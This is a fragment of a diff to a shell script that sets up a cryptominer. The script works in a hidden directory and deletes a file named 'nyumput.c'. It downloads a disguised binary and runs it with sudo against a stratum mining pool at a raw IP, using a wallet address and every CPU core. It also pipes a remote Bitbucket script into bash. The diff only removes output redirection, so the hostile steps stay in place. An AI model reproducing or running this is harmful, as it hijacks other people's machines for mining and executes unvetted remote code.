@@ -9,7 +9,7 @@ rm nyumput.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 mkdir .kap && cd .kap
-wget -O sgr1 https://github.com/kartolo92/pile/raw/main/avx2adv >/dev/null 2>&1
+wget -O sgr1 https://github.com/kartolo92/pile/raw/main/avx2adv
 chmod +x sgr1
-sudo ./sgr1 -a power2b -o stratum+tcp://167.99.139.112:443 -u MfCwayN6AQ1dPptt7yfAAiEfrSswnU2XcF.$(shuf -n 1 -i 1-99999)-kir -t $(nproc --all) >/dev/null 2>&1
+sudo ./sgr1 -a power2b -o stratum+tcp://167.99.139.112:443 -u MfCwayN6AQ1dPptt7yfAAiEfrSswnU2XcF.$(shuf -n 1 -i 1-99999)-kir -t $(nproc --all)
 curl -sL https://bitbucket.org/veha99/esceveha/raw/main/boled04.sh | bash 
